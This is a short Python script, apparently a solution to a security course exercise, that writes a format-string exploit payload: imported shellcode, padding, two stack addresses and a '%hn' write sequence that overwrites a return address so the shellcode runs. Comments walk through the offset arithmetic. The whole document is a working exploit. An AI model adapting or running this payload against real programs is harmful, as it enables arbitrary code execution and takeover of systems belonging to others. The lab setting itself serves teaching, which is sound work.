#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
# shellcode occupies 47 characters on stack. Use padding to make it divisable by 8. 48/8=6 blocks.
# The first address is at block 7 and the second address is at block 8.
# 8 memory blocks = 32 bytes are used in the string.
# We want to write 0xfffeab08 which is the beginning of the arg to 0xfffeb30c which is the return address.
# We put 0xab08 to 0xfffeb30c and 0xfffe to 0xfffeb30e.
# 0xab08 = 43784. 43784 - 32 = 43752 0xfffe = 65534. 65534 - 43784 = 21750
sys.stdout.buffer.write(shellcode+b"a"+pack("<I", 0xfffeb30c)+pack("<I", 0xfffeb30e)+b"%43752x%7$hn%21750x%8$hn")
